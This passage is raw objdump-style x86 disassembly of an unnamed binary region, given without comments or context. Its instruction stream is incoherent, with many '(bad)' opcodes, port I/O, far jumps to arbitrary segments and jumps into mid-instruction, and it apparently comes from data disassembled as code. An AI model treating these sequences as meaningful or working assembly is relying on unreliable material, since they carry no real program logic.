  40df2f:	pop    ecx
  40df30:	into   
  40df31:	pop    ebx
  40df32:	pop    ebx
  40df33:	or     eax,0x68a3097a
  40df38:	neg    DWORD PTR [edx-0x4b]
  40df3b:	xchg   esp,eax
  40df3c:	or     BYTE PTR [edx+edi*1],bh
  40df3f:	mov    dl,0x45
  40df41:	mov    eax,0xf7932aff
  40df46:	push   esp
  40df47:	or     bl,bl
  40df49:	xchg   edx,eax
  40df4a:	mov    al,0x53
  40df4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df4d:	fisubr DWORD PTR [esi+0x3928b1a5]
  40df53:	in     al,0x11
  40df55:	add    al,0x41
  40df57:	pop    edx
  40df58:	add    DWORD PTR [edi+0x3f],eax
  40df5b:	fcmovnbe st,st(6)
  40df5d:	out    0x26,al
  40df5f:	imul   ebp,DWORD PTR [ebx+0x6b],0xfffffff6
  40df63:	jns    0x40df0f
  40df65:	fisubr DWORD PTR [esi-0x3ecec6d0]
  40df6b:	rcl    dl,cl
  40df6d:	pop    ebp
  40df6e:	jl     0x40df63
  40df70:	aaa    
  40df71:	mov    edi,0xa2884801
  40df76:	add    DWORD PTR [ebx],ebp
  40df78:	xchg   edi,eax
  40df79:	das    
  40df7a:	repnz aam 0xd3
  40df7d:	(bad)  
  40df7e:	pop    eax
  40df7f:	pop    esi
  40df80:	mov    esi,0x9d2f8bcc
  40df85:	out    0xb9,al
  40df87:	pop    ss
  40df88:	sahf   
  40df89:	addr16 in eax,0x6a
  40df8c:	test   DWORD PTR [ebp+0x7b2426ed],ebp
  40df92:	rcr    BYTE PTR [ebx-0x1aa380fe],0xa2
  40df99:	sub    cl,BYTE PTR [ecx]
  40df9b:	dec    ebp
  40df9c:	cwde   
  40df9d:	xchg   BYTE PTR [ecx],bl
  40df9f:	je     0x40dfbe
  40dfa1:	xchg   esp,eax
  40dfa2:	pusha  
  40dfa3:	bound  edx,QWORD PTR [edi]
  40dfa5:	adc    ch,ch
  40dfa7:	pop    esi
  40dfa8:	shl    DWORD PTR [eax+0x5e],cl
  40dfab:	call   0x47d2623
  40dfb0:	cmp    edi,DWORD PTR [eax+0x2a]
  40dfb3:	adc    al,bh
  40dfb5:	repnz out dx,eax
  40dfb7:	stos   BYTE PTR es:[edi],al
  40dfb8:	adc    edx,ebp
  40dfba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfbb:	cmc    
  40dfbc:	jns    0x40dff7
  40dfbe:	fild   DWORD PTR [eax-0x4e6abbac]
  40dfc4:	inc    esp
  40dfc6:	test   al,0x7b
  40dfc8:	(bad)  
  40dfc9:	sub    dl,BYTE PTR [esi]
  40dfcb:	and    BYTE PTR [ebx],ch
  40dfcd:	loope  0x40df74
  40dfcf:	out    dx,al
  40dfd0:	stos   DWORD PTR es:[edi],eax
  40dfd1:	pop    esp
  40dfd2:	sbb    al,0xbf
  40dfd4:	push   esi
  40dfd5:	dec    ebx
  40dfd6:	fs add edx,edx
  40dfd9:	mov    cl,0xde
  40dfdb:	or     DWORD PTR [edx+edi*8+0x22406580],0xfffffff3
  40dfe3:	ds pop edx
  40dfe5:	push   0x1dca7569
  40dfea:	mov    bl,0x19
  40dfec:	fwait
  40dfed:	arpl   WORD PTR [esi-0x3f1e47ef],cx
  40dff3:	push   edx
  40dff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dff5:	mov    bl,0x5
  40dff7:	add    ah,BYTE PTR gs:0x24a9406f
  40dffe:	sbb    ah,dh
  40e000:	arpl   bp,bx
  40e002:	dec    ebp
  40e003:	fst    DWORD PTR [eax+0x60]
  40e006:	push   eax
  40e007:	aad    0x80
  40e009:	mov    al,BYTE PTR [edx*1-0x45301bd0]
  40e010:	or     dl,BYTE PTR [eax+0x64ee0047]
  40e016:	sbb    ebp,DWORD PTR [ecx]
  40e018:	mov    cl,0xdb
  40e01a:	push   ebx
  40e01b:	enter  0x8f9f,0xe9
  40e01f:	push   esi
  40e020:	sub    eax,0x25c2789f
  40e025:	sbb    BYTE PTR [edi+0x2],dh
  40e028:	dec    edx
  40e029:	push   ds
  40e02a:	retf   0xd5e7
  40e02d:	and    DWORD PTR [edx+0x4d58a063],0x70
  40e034:	test   DWORD PTR [ecx-0x57],0x5cde818a
  40e03b:	adc    edx,DWORD PTR [eax]
  40e03d:	and    al,0x6c
  40e03f:	je     0x40dff8
  40e041:	sub    BYTE PTR [ebp-0x6b],ch
  40e044:	sub    DWORD PTR [ebp-0x5be358b],eax
  40e04a:	jp     0x40e05e
  40e04c:	je     0x40dfe6
  40e04e:	test   eax,0x2638d77e
  40e053:	or     al,BYTE PTR [ebx+0x4a]
  40e056:	jp     0x40e01e
  40e058:	popf   
  40e059:	popa   
  40e05a:	add    al,0x7e
  40e05c:	adc    BYTE PTR [eax+0x39fa8759],ch
  40e062:	mov    ds:0xc5d2e228,eax
  40e067:	mov    ebx,DWORD PTR [esp+edi*4+0x70]
  40e06b:	add    edi,ecx
  40e06d:	repz sub BYTE PTR [edi+0x2a],dl
  40e071:	xor    al,0x9b
  40e073:	dec    ebp
  40e074:	mov    dh,0xc6
  40e077:	sbb    BYTE PTR [edi],bl
  40e079:	pop    ds
  40e07a:	out    0x6d,eax
  40e07c:	outs   dx,DWORD PTR ds:[esi]
  40e07d:	jge    0x40e0aa
  40e07f:	sar    DWORD PTR [ebx],0x7d
  40e082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e083:	mov    ecx,gs
  40e085:	mov    ah,0xb7
  40e087:	cmp    BYTE PTR [ecx+0x72],dh
  40e08a:	cdq    
  40e08b:	dec    ebx
  40e08c:	xchg   edi,eax
  40e08d:	(bad)  
  40e08e:	mov    eax,0x89cbb170
  40e093:	push   ebx
  40e094:	fistp  DWORD PTR [esi+edi*4-0x4e]
  40e098:	(bad)  
  40e099:	cli    
  40e09a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e09b:	in     al,0xd2
  40e09d:	push   ebp
  40e09e:	fsubr  DWORD PTR [edi+eax*1+0x24]
  40e0a2:	std    
  40e0a3:	inc    eax
  40e0a4:	sbb    DWORD PTR [ebx],ebx
  40e0a6:	std    
  40e0a7:	jge    0x40e043
  40e0a9:	sub    DWORD PTR [eax+eax*8+0x19063150],eax
  40e0b0:	inc    ebx
  40e0b1:	adc    al,BYTE PTR [edx]
  40e0b3:	push   ecx
  40e0b4:	dec    esi
  40e0b5:	jge    0x40e0e7
  40e0b7:	dec    esp
  40e0b8:	rcr    al,0x5
  40e0bb:	mov    esp,0x3b677bec
  40e0c0:	xor    bl,ch
  40e0c2:	sub    al,0x74
  40e0c4:	pushf  
  40e0c5:	mov    ebp,0x523a8724
  40e0ca:	fild   DWORD PTR [eax+0x528ea44c]
  40e0d0:	(bad)  
  40e0d1:	jae    0x40e108
  40e0d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0d4:	ror    BYTE PTR [ebx+0x12],0xf5
  40e0d8:	sub    BYTE PTR [esi+0x2fa472c9],bl
  40e0de:	cwde   
  40e0df:	xchg   ecx,eax
  40e0e0:	repnz cmp DWORD PTR [ebx-0x351bbc42],ecx
  40e0e7:	add    al,0x60
  40e0e9:	mov    ecx,0xa7a5d66e
  40e0ee:	outs   dx,DWORD PTR ds:[esi]
  40e0ef:	scas   eax,DWORD PTR es:[edi]
  40e0f0:	(bad)  
  40e0f1:	loop   0x40e087
  40e0f3:	popa   
  40e0f4:	jmp    0x5ed5cd74
  40e0f9:	cmp    al,0x1d
  40e0fb:	retf   
  40e0fc:	fnstenv [ecx]
  40e0fe:	in     al,dx
  40e0ff:	fimul  DWORD PTR [ecx]
  40e101:	sub    al,0x33
  40e103:	add    bl,ch
  40e105:	push   es
  40e106:	mov    WORD PTR [esi+0x47bb309],es
  40e10c:	mov    esi,0xa9451317
  40e111:	ffree  st(0)
  40e113:	add    dh,BYTE PTR gs:[ecx+0x1c]
  40e117:	(bad)  
  40e118:	dec    esp
  40e119:	mov    ds:0x550b5a77,eax
  40e11e:	adc    ah,ah
  40e120:	mov    dh,0xb7
  40e122:	frstor [eax]
  40e124:	add    BYTE PTR [ecx],cl
  40e126:	in     al,0xf4
  40e128:	jg     0x40e121
  40e12a:	inc    ebp
  40e12b:	push   edx
  40e12c:	push   es
  40e12d:	nop
  40e12e:	(bad)  
  40e12f:	jnp    0x40e168
  40e131:	add    al,0x9b
  40e133:	adc    bh,BYTE PTR [eax]
  40e135:	fcom   QWORD PTR [eax+0xfdae441]
  40e13b:	xchg   edx,eax
  40e13c:	jmp    0x40e182
  40e13e:	push   edi
  40e13f:	inc    ebp
  40e140:	mov    eax,0x48a28b5e
  40e145:	xor    DWORD PTR [eax+0x24b7b89b],eax
  40e14b:	mov    eax,ds:0x6b518fe9
  40e150:	dec    edi
  40e151:	push   edx
  40e152:	pop    edx
  40e153:	lods   eax,DWORD PTR ds:[esi]
  40e154:	xor    cl,dh
  40e156:	push   ds
  40e157:	cmp    BYTE PTR [eax+0x52],0x9
  40e15b:	cmp    edi,DWORD PTR ds:0x2861ddf8
  40e161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e162:	stos   BYTE PTR es:[edi],al
  40e163:	cwde   
  40e164:	jecxz  0x40e16d
  40e166:	push   0xffffff82
  40e168:	mov    BYTE PTR [ecx+0x3c],cl
  40e16b:	and    bh,BYTE PTR [edi+ecx*4]
  40e16e:	fsub   DWORD PTR [ecx-0x58]
  40e171:	mov    esi,0xab5411e7
  40e176:	cli    
  40e177:	push   ds
  40e178:	adc    BYTE PTR [esp+esi*4-0x2127494a],0xdc
  40e180:	in     al,0x5c
  40e182:	dec    esi
  40e183:	push   ebp
  40e184:	stos   BYTE PTR es:[edi],al
  40e185:	push   esp
  40e186:	sub    cl,BYTE PTR [esp+ecx*2+0x4e]
  40e18a:	lock xchg BYTE PTR [edi+0x66d6f896],al
  40e191:	xor    DWORD PTR [ecx-0x3475654f],0x20
  40e198:	pusha  
  40e199:	jne    0x40e210
  40e19b:	adc    DWORD PTR [edi-0x3436c5a2],0x27
  40e1a2:	xchg   esi,eax
  40e1a3:	jns    0x40e186
  40e1a5:	clc    
  40e1a6:	pop    ecx
  40e1a7:	mov    esi,0x6b2ae4f6
  40e1ac:	jmp    0x40e1d3
  40e1ae:	ss mov dh,0xc7
  40e1b1:	and    BYTE PTR [esi+0x414d285],bl
  40e1b7:	dec    ebp
  40e1b8:	test   al,0xf8
  40e1ba:	mov    al,al
  40e1bc:	inc    ebp
  40e1bd:	mov    ds:0x55274291,al
  40e1c2:	and    eax,0x44c9aed0
  40e1c7:	ret    
  40e1c8:	ja     0x40e16b
  40e1ca:	and    ebx,DWORD PTR [ebp-0x54e1098e]
  40e1d0:	add    al,0x5b
  40e1d2:	add    al,0xa1
  40e1d4:	and    DWORD PTR [ebp-0x62ac3edd],edi
  40e1da:	pop    ecx
  40e1db:	iret   
  40e1dc:	mov    ebp,0x24921d40
  40e1e1:	push   ds
  40e1e2:	mov    eax,edx
  40e1e4:	test   BYTE PTR [edi*1+0x4a1534cb],ch
  40e1eb:	xor    al,BYTE PTR [ecx+0x4a]
  40e1ee:	sub    DWORD PTR [ebx],esi
  40e1f0:	push   eax
  40e1f1:	cmp    ecx,ecx
  40e1f3:	ds inc ebx
  40e1f5:	add    al,dl
  40e1f7:	sbb    cl,ch
  40e1f9:	in     al,dx
  40e1fa:	arpl   WORD PTR [ecx],di
  40e1fc:	shl    DWORD PTR [ebx+0x46],0xd
  40e200:	mov    al,0xdd
  40e202:	out    0xa8,eax
  40e204:	adc    eax,0x10ecdc66
  40e209:	push   ss
  40e20a:	sub    al,0x65
  40e20c:	and    esi,DWORD PTR ds:[ecx-0x54abe32d]
  40e213:	add    ah,BYTE PTR es:0xaf11070c
  40e21a:	mov    ebp,0xc56a8c67
  40e21f:	arpl   WORD PTR ds:0x974ea2ca,di
  40e225:	or     DWORD PTR [eax+0x59828038],ebx
  40e22b:	mov    al,0xcb
  40e22d:	shl    BYTE PTR [esi-0xf],0xd
  40e231:	outs   dx,DWORD PTR ds:[esi]
  40e232:	ins    DWORD PTR es:[edi],dx
  40e233:	fisttp DWORD PTR ds:0xe10b6802
  40e239:	xor    DWORD PTR [eax],ebx
  40e23b:	hlt    
  40e23c:	push   ebp
  40e23d:	aam    0x53
  40e23f:	leave  
  40e240:	je     0x40e2b8
  40e242:	push   ds
  40e243:	bound  ebp,QWORD PTR [ebx]
  40e245:	dec    esi
  40e246:	(bad)  
  40e248:	imul   esp,DWORD PTR [esi-0x107adfb4],0x8b01b93b
  40e252:	lods   al,BYTE PTR ds:[esi]
  40e253:	stc    
  40e254:	xlat   BYTE PTR ds:[ebx]
  40e255:	inc    edx
  40e256:	add    eax,0x35172d3b
  40e25b:	pop    ss
  40e25c:	jne    0x40e2d6
  40e25e:	mov    esi,0x9f9cce9a
  40e263:	sub    BYTE PTR [ebp+ebx*4+0xe],dh
  40e267:	inc    eax
  40e268:	dec    edx
  40e269:	dec    ecx
  40e26a:	dec    ecx
  40e26b:	xchg   esi,eax
  40e26c:	cmp    ah,cl
  40e26e:	aaa    
  40e26f:	adc    DWORD PTR [esi-0x13],ebx
  40e272:	push   ecx
  40e273:	xchg   edx,eax
  40e274:	push   ebp
  40e275:	les    esp,FWORD PTR [eax-0x3949b3b4]
  40e27b:	fwait
  40e27c:	and    DWORD PTR [edx-0x80],esp
  40e27f:	cmp    BYTE PTR [edx+0x3cac7190],cl
  40e285:	push   cs
  40e286:	sahf   
  40e287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e288:	push   0xf
  40e28a:	and    al,0x89
  40e28c:	lods   eax,DWORD PTR ds:[esi]
  40e28d:	and    cx,WORD PTR [ebp+0x1f]
  40e291:	cwde   
  40e292:	(bad)  [eax-0x112f7be8]
  40e298:	leave  
  40e299:	shr    ch,0x37
  40e29c:	ins    DWORD PTR es:[edi],dx
  40e29d:	pop    edi
  40e29e:	mov    eax,0xcb02fe78
  40e2a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2a4:	iret   
  40e2a5:	add    al,ah
  40e2a7:	pop    es
  40e2a8:	add    DWORD PTR [ebp-0xe4e66b6],edx
  40e2ae:	jno    0x40e296
  40e2b0:	out    0x66,al
  40e2b2:	jns    0x40e291
  40e2b4:	jmp    0x40e2a4
  40e2b6:	jecxz  0x40e2d5
  40e2b8:	out    dx,eax
  40e2b9:	jl     0x40e2d3
  40e2bb:	fs dec esp
  40e2bd:	mov    bh,0xd7
  40e2bf:	out    0xec,al
  40e2c1:	(bad)  [ebx-0x64]
  40e2c4:	cmp    BYTE PTR [ecx-0x6a],dh
  40e2c7:	scas   eax,DWORD PTR es:[edi]
  40e2c8:	cmp    eax,0x9ea78e71
  40e2cd:	pop    ebp
  40e2ce:	out    0xdc,al
  40e2d0:	stc    
  40e2d1:	mov    BYTE PTR [ebx],ch
  40e2d3:	sbb    ecx,DWORD PTR ds:0xb2a4cec2
  40e2d9:	daa    
  40e2da:	xchg   esp,eax
  40e2db:	mov    eax,es:0x854a0bc
  40e2e1:	add    DWORD PTR [esi+0x9],0x4335881d
  40e2e8:	mov    al,0x5e
  40e2ea:	or     ch,bh
  40e2ec:	je     0x40e2b0
  40e2ee:	ja     0x40e28e
  40e2f0:	xor    al,0x7d
  40e2f2:	dec    edi
  40e2f3:	cmc    
  40e2f4:	loopne 0x40e348
  40e2f6:	jmp    0x40e2d4
  40e2f8:	jns    0x40e2af
  40e2fa:	inc    eax
  40e2fb:	out    0x6,eax
  40e2fd:	rol    BYTE PTR [ebx],0x3d
  40e300:	daa    
  40e301:	and    BYTE PTR [ecx],dh
  40e303:	rcr    BYTE PTR [esi+eiz*1+0x2a],1
  40e307:	sbb    eax,0xc61c1597
  40e30c:	test   al,0x27
  40e30e:	shl    ecx,cl
  40e310:	and    eax,0xe386dd84
  40e315:	jp     0x40e2cd
  40e317:	jmp    0xc4dd:0x69321dbd
  40e31e:	adc    DWORD PTR ds:0x48e81ec1,edx
  40e324:	je     0x40e2e9
  40e326:	and    al,0x4
  40e328:	(bad)  
  40e329:	and    edx,DWORD PTR [esi+ebx*2+0x7725974c]
  40e330:	out    0xba,al
  40e332:	fdiv   st,st(7)
  40e334:	mov    ch,0xb9
  40e336:	push   cs
  40e337:	aad    0x77
  40e339:	mov    ebx,esp
  40e33b:	nop
  40e33c:	leave  
  40e33d:	mov    DWORD PTR [edx+0x66],edi
  40e340:	data16 ins BYTE PTR es:[edi],dx
  40e342:	adc    DWORD PTR [edx-0xb],edi
  40e345:	cmp    al,0x8f
  40e347:	push   eax
  40e348:	pop    ss
  40e349:	mov    ds:0x1ff3b5c9,al
  40e34e:	sti    
  40e34f:	fadd   st,st(7)
  40e351:	or     cl,BYTE PTR [ebx]
  40e353:	add    eax,0x2bb6eade
  40e358:	add    al,0x20
  40e35a:	test   al,dl
  40e35c:	dec    ecx
  40e35d:	xor    al,0xc
  40e35f:	push   ecx
  40e360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e361:	cmp    ebp,ebp
  40e363:	aaa    
  40e364:	shl    BYTE PTR [ecx],cl
  40e366:	aam    0xe9
  40e368:	neg    DWORD PTR [edi]
  40e36a:	jne    0x40e367
  40e36c:	in     eax,dx
  40e36d:	adc    al,0xaf
  40e36f:	jg     0x40e34e
  40e371:	pop    es
  40e372:	enter  0x579d,0xe4
  40e376:	and    DWORD PTR [eax],ebp
  40e378:	bound  edx,QWORD PTR [edx]
  40e37a:	out    dx,al
  40e37b:	mov    cl,0x52
  40e37d:	dec    edx
  40e37e:	push   0xffffffcd
  40e380:	es xchg ebp,eax
  40e382:	push   0x55
  40e384:	gs stos BYTE PTR es:[edi],al
  40e386:	lea    esp,[edx]
  40e388:	push   es
  40e389:	std    
  40e38a:	ds push ecx
  40e38c:	sbb    al,0xdb
  40e38e:	inc    ecx
  40e38f:	imul   esp,DWORD PTR [esi-0x52],0xffffffe1
  40e393:	adc    ah,BYTE PTR [edi-0x676c7202]
  40e399:	pusha  
  40e39a:	pop    eax
  40e39b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e39c:	adc    al,0x56
  40e39e:	je     0x40e35e
  40e3a0:	sti    
  40e3a1:	sub    BYTE PTR ds:0x11f7f97f,bl
  40e3a7:	push   0xffffffa0
  40e3a9:	test   BYTE PTR [ecx-0x5c],dl
  40e3ac:	hlt    
  40e3ad:	aas    
  40e3ae:	sub    DWORD PTR [ebp-0x39db8e0f],ebp
  40e3b4:	inc    ecx
  40e3b5:	xor    eax,DWORD PTR ds:0x52d34de5
  40e3bb:	and    al,0x7f
  40e3bd:	pushf  
  40e3be:	push   eax
  40e3bf:	jno    0x40e3cc
  40e3c1:	adc    eax,0x2e5ca7df
  40e3c6:	arpl   WORD PTR [edx+0x3dbbf4f6],si
  40e3cc:	fcmovu st,st(3)
  40e3ce:	sub    eax,0x833e9ece
  40e3d3:	adc    dl,al
  40e3d5:	mov    edx,0x2e2ef726
  40e3da:	xor    dh,BYTE PTR ds:0xdfc3c935
  40e3e0:	repnz out 0x79,eax
  40e3e3:	(bad)  
  40e3e4:	sti    
  40e3e5:	(bad)  
  40e3e7:	jo     0x40e3b9
  40e3e9:	gs jae 0x40e39f
  40e3ec:	lds    ecx,FWORD PTR [ebx+0x2f]
  40e3ef:	lahf   
  40e3f0:	loope  0x40e3eb
  40e3f2:	mov    ds:0xc5e17917,eax
  40e3f7:	adc    eax,0x32f4bf8e
  40e3fc:	pop    ss
  40e3fd:	cs (bad) 
  40e3ff:	fldz   
  40e401:	out    dx,eax
  40e402:	and    DWORD PTR [edx-0x7f28efb5],ecx
  40e408:	or     DWORD PTR [eax],ecx
  40e40a:	test   BYTE PTR [eax+0x10],0x80
  40e40e:	sbb    BYTE PTR [eax],al
  40e410:	add    edx,DWORD PTR [edi+edx*8-0x388efc5f]
  40e417:	cmp    al,0x30
  40e419:	sbb    BYTE PTR [edi],bh
  40e41b:	mov    edi,0x2f6e4944
  40e420:	popf   
  40e421:	aad    0x57
  40e423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e424:	push   ss
  40e425:	test   al,0x70
  40e427:	imul   ebx,edi,0x2224cfba
  40e42d:	int    0x8
  40e42f:	sub    al,0x13
  40e431:	shl    DWORD PTR gs:[edi+0x24],0x7f
  40e436:	stos   BYTE PTR es:[edi],al
  40e437:	jae    0x40e3f4
  40e439:	dec    esp
  40e43a:	add    BYTE PTR [ebx+0x3cfd5d30],cl
  40e440:	inc    ebx
  40e441:	push   esp
  40e442:	and    dh,BYTE PTR [ebp-0x411727fb]
  40e448:	or     al,0xf1
  40e44a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e44b:	cmp    bl,BYTE PTR [ebx-0x1db924b7]
  40e451:	dec    esp
  40e452:	sub    al,0x12
  40e454:	out    dx,al
  40e455:	cmc    
  40e456:	mov    WORD PTR [edx-0x2b44dd1c],cs
  40e45c:	mov    al,0x99
  40e45e:	and    al,0x1e
  40e460:	xor    cl,BYTE PTR [ecx+0x66357a8]
  40e466:	and    ecx,0xffffff8e
  40e469:	and    BYTE PTR [eax+ecx*1],0x82
  40e46d:	imul   esp,DWORD PTR [ebp+0x3],0xffffffbe
  40e471:	push   esp
  40e472:	js     0x40e446
  40e474:	ins    DWORD PTR es:[edi],dx
  40e475:	push   0x381d3537
  40e47a:	popf   
  40e47b:	or     DWORD PTR [eax+0x7c],ebx
  40e47e:	pushf  
  40e47f:	cmp    edi,0x120e5100
  40e485:	sbb    DWORD PTR [edx],esp
  40e487:	sub    al,0x22
  40e489:	pop    esp
  40e48a:	idiv   DWORD PTR [esi]
  40e48c:	out    dx,al
  40e48d:	mov    esi,0xa8df113c
  40e492:	xor    DWORD PTR [eax-0xc],esi
  40e495:	mov    ecx,0x894b2f4
  40e49a:	dec    edi
  40e49b:	stc    
  40e49c:	lock dec ebx
  40e49e:	push   edx
  40e49f:	push   edx
  40e4a0:	test   eax,0xad2501d7
  40e4a5:	cmc    
  40e4a6:	inc    ebp
  40e4a7:	lock jne 0x40e490
  40e4aa:	(bad)  
  40e4ab:	shl    DWORD PTR [eax+0x40],0xac
  40e4af:	shl    DWORD PTR [ecx-0x67],cl
  40e4b2:	sti    
  40e4b3:	test   ecx,edx
  40e4b5:	shl    BYTE PTR [ecx+0x6f7abb32],1
  40e4bb:	data16 js 0x40e497
  40e4be:	ss or  al,0x43
  40e4c1:	dec    edx
  40e4c2:	inc    ecx
  40e4c3:	pusha  
  40e4c4:	pop    es
  40e4c5:	mov    cl,0xd0
  40e4c7:	xchg   edx,eax
  40e4c8:	pop    edi
  40e4c9:	jmp    0x83d4:0x4cf730e7
  40e4d0:	push   0xffffffe3
  40e4d2:	jne    0x40e4ea
  40e4d4:	adc    eax,0x1d4ff2a5
  40e4d9:	sub    esi,DWORD PTR ds:0x8f3cf704
  40e4df:	push   edx
  40e4e0:	mov    ecx,0x512a504c
  40e4e5:	test   eax,0x4938854
  40e4ea:	sbb    edi,eax
  40e4ec:	je     0x40e4c9
  40e4ee:	ins    DWORD PTR es:[edi],dx
  40e4ef:	pop    esi
  40e4f0:	cmp    bh,BYTE PTR [esi-0x24]
  40e4f3:	mov    edx,0x2ad5aa9d
  40e4f8:	aad    0x6a
  40e4fa:	xchg   ebp,eax
  40e4fb:	out    0xf8,al
  40e4fd:	sbb    ch,cl
  40e4ff:	inc    esi
  40e500:	xor    DWORD PTR [edi+0x7d],0xffffffeb
  40e504:	mov    ebp,0x3a6df3bc
  40e509:	sub    DWORD PTR [ebp-0x42829f21],eax
  40e50f:	retf   
  40e510:	jbe    0x40e53d
  40e512:	out    0xea,al
  40e514:	pop    edx
  40e515:	(bad)  
  40e516:	retf   
  40e517:	scas   eax,DWORD PTR es:[edi]
  40e518:	lods   al,BYTE PTR ds:[esi]
  40e519:	jb     0x40e517
  40e51b:	in     eax,0xd3
  40e51d:	mov    esp,0xc5cbaa7c
  40e522:	sub    ecx,DWORD PTR ds:0x854576a2
  40e528:	add    BYTE PTR [edi-0x7b4d5e59],dl
  40e52e:	xor    eax,0xef2b1200
  40e533:	sbb    DWORD PTR [eax+ebp*1],0xffffffc6
  40e537:	nop
  40e538:	hlt    
  40e539:	push   eax
  40e53a:	inc    esi
  40e53b:	aas    
  40e53c:	ins    DWORD PTR es:[edi],dx
  40e53d:	dec    edi
  40e53e:	xor    BYTE PTR [esi],dh
  40e540:	test   DWORD PTR [edx*4-0x665bc04],eax
  40e547:	repz pop edx
  40e549:	cmovg  edi,DWORD PTR [eiz*4-0x20b747fe]
  40e551:	hlt    
  40e552:	test   eax,0x9e50c35a
  40e557:	mov    eax,DWORD PTR [esi]
  40e559:	xchg   esp,eax
  40e55a:	mov    edx,0x52679b9f
  40e55f:	pusha  
  40e560:	rcl    DWORD PTR [edi-0x33],1
  40e563:	mov    eax,0x827b5d2e
  40e568:	ret    
  40e569:	cmp    al,0x2c
  40e56b:	popa   
  40e56c:	cmp    edi,DWORD PTR ds:0x3e61909c
  40e572:	out    0x50,al
  40e574:	(bad)  
  40e575:	mov    edx,0x89884ca3
  40e57a:	retf   0xd50a
  40e57d:	push   0x1e1c8e08
  40e582:	sbb    esi,DWORD PTR [ecx+0x1]
  40e585:	mov    edx,0x7df7d3e3
  40e58a:	fwait
  40e58b:	jp     0x40e53a
  40e58d:	mov    al,ds:0xf1b45cbd
  40e592:	jbe    0x40e548
  40e594:	fwait
  40e595:	dec    edx
  40e596:	or     BYTE PTR [edx+0x238d66fe],dl
  40e59c:	mov    ds:0x68a21f70,eax
  40e5a1:	pop    eax
  40e5a2:	test   al,0x2
  40e5a4:	in     al,dx
  40e5a5:	adc    al,0xe5
  40e5a7:	out    0xc6,eax
  40e5a9:	adc    al,al
  40e5ab:	into   
  40e5ac:	or     al,0xe1
  40e5ae:	jp     0x40e61a
  40e5b0:	inc    eax
  40e5b1:	sahf   
  40e5b2:	adc    DWORD PTR [eax*1+0x2ab90a],edx
  40e5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5ba:	xor    BYTE PTR [eax+0x68],dl
  40e5bd:	dec    ecx
  40e5be:	pop    ebx
  40e5bf:	or     eax,0xa6a7c602
  40e5c4:	adc    al,0x8c
  40e5c6:	xlat   BYTE PTR ds:[ebx]
  40e5c7:	shl    BYTE PTR [esi-0x7aed1229],cl
  40e5cd:	and    DWORD PTR [ecx+0x18],esp
  40e5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5d1:	out    0xbb,eax
  40e5d3:	pop    ds
  40e5d4:	fucomp st(5)
  40e5d6:	and    eax,0x22893dbd
  40e5db:	and    ch,BYTE PTR [ebp+0x4]
  40e5de:	adc    bh,BYTE PTR [ecx+0x2a8e9167]
  40e5e4:	lea    ecx,fs:[eax+0x62c65842]
  40e5eb:	mov    cs,WORD PTR [ebp-0x64]
  40e5ee:	imul   ebx,DWORD PTR [edx+0x7d38c30c],0xffffffe9
  40e5f5:	and    ch,BYTE PTR [ebx]
  40e5f7:	loope  0x40e5f4
  40e5f9:	mov    al,cl
  40e5fb:	xchg   ebp,eax
  40e5fc:	retf   
  40e5fd:	inc    esp
  40e5fe:	push   ecx
  40e5ff:	inc    esp
  40e600:	mov    edi,0xebd7a7df
  40e605:	rcl    ebx,1
  40e607:	imul   eax,eax,0xcd3c35cc
  40e60d:	add    al,0x1b
  40e60f:	lea    ebx,[edx]
  40e611:	jecxz  0x40e5f6
  40e613:	jecxz  0x40e601
  40e615:	fnstsw WORD PTR [ebx]
  40e617:	iret   
  40e618:	jge    0x40e611
  40e61a:	dec    esp
  40e61b:	repz fstp QWORD PTR [edi]
  40e61e:	mov    edx,0xb413df07
  40e623:	cmp    eax,DWORD PTR [ebx]
  40e625:	pop    esi
  40e626:	ds jno 0x40e5ba
  40e629:	out    0x8f,eax
  40e62b:	scas   al,BYTE PTR es:[edi]
  40e62c:	jo     0x40e622
  40e62e:	fcom   DWORD PTR [ebp-0x62]
  40e631:	jp     0x40e631
  40e633:	sbb    al,0x27
  40e635:	dec    edi
  40e636:	or     DWORD PTR [edx],edi
  40e638:	in     eax,dx
  40e639:	push   es
  40e63a:	inc    esp
  40e63b:	xor    eax,0x6543cea8
  40e640:	sbb    al,BYTE PTR [edx-0x2bcaabee]
  40e646:	(bad)  
  40e647:	cmp    cl,dl
  40e649:	sti    
  40e64a:	adc    BYTE PTR [edi+0x52112fd4],dh
  40e650:	(bad)  
  40e651:	ss jmp 0x40e602
  40e654:	adc    al,0xc6
  40e656:	push   ebp
  40e657:	sub    al,0xc0
  40e659:	dec    edi
  40e65a:	adc    al,bh
  40e65c:	or     BYTE PTR [ebx],dl
  40e65e:	jno    0x40e647
  40e660:	inc    edx
  40e661:	jle    0x40e6ca
  40e663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e664:	jmp    0x2ca4bcb7
  40e669:	addr16 mov al,ds:0xdcb3
  40e66d:	inc    ebx
  40e66e:	adc    ebp,DWORD PTR [edi+0x1dc22830]
  40e674:	pop    esp
  40e675:	jmp    0x7bd8:0x42f9993f
  40e67c:	gs or  eax,0xa34a8e7d
  40e682:	aad    0x89
  40e684:	and    bh,BYTE PTR [esi+0x428066a2]
  40e68a:	sbb    al,0x9
  40e68c:	jmp    0x4510:0x6c5a584d
  40e693:	popf   
  40e694:	sbb    eax,0xfbef9dc7
  40e699:	mov    ah,0xdb
  40e69b:	ins    DWORD PTR es:[edi],dx
  40e69c:	mov    ds:0x184ca28,al
  40e6a1:	jmp    0x40e686
  40e6a3:	into   
  40e6a4:	(bad)  
  40e6a5:	fsubrp st(1),st
